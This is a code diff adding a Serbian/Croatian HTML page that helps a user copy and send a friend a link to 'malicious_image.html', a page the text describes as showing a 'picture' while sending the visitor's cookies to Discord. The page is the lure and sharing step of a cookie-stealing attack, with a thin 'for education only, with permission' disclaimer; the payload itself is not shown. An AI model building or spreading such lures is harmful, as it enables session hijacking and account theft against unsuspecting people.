@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pošalji Sliku</title>
+    <style>
+        body { font-family: Arial; padding: 20px; max-width: 600px; margin: 0 auto; }
+        .container { background: #f5f5f5; padding: 20px; border-radius: 10px; }
+        button { background: #7289da; color: white; border: none; padding: 15px 30px; margin: 10px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .url-box { background: white; padding: 15px; border-radius: 5px; margin: 10px 0; border: 2px dashed #ccc; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📤 Pošalji "Sliku" Prijatelju</h1>
+        
+        <p>Kopiraj ovaj link i pošalji prijatelju:</p>
+        
+        <div class="url-box">
+            <strong id="maliciousUrl">http://tvoj-sajt.com/malicious_image.html</strong>
+            <button onclick="copyUrl()">Kopiraj URL</button>
+        </div>
+
+        <p>Kada prijatelj otvori link:</p>
+        <ul>
+            <li>Videće "sliku"</li>
+            <li>Njihovi cookie-i će biti poslati na Discord</li>
+            <li>Ovo je <strong>samo za edukaciju</strong></li>
+        </ul>
+
+        <div class="warning">
+            ⚠️ Koristiti SAMO sa test nalozima i uz dozvolu!
+        </div>
+
+        <button onclick="testYourself()">Testiraj na sebi</button>
+    </div>
+
+    <script>
+        function copyUrl() {
+            const url = document.getElementById('maliciousUrl').textContent;
+            navigator.clipboard.writeText(url).then(() => {
+                alert("URL kopiran! Sada ga pošalji prijatelju.");
+            });
+        }
+
+        function testYourself() {
+            window.open('malicious_image.html', '_blank');
+        }
+
+        // Ažuriraj URL ako hostuješ online
+        const currentUrl = window.location.href;
+        const baseUrl = currentUrl.substring(0, currentUrl.lastIndexOf('/') + 1);
+        document.getElementById('maliciousUrl').textContent = baseUrl + 'malicious_image.html';
+    </script>
+</body>
+</html>
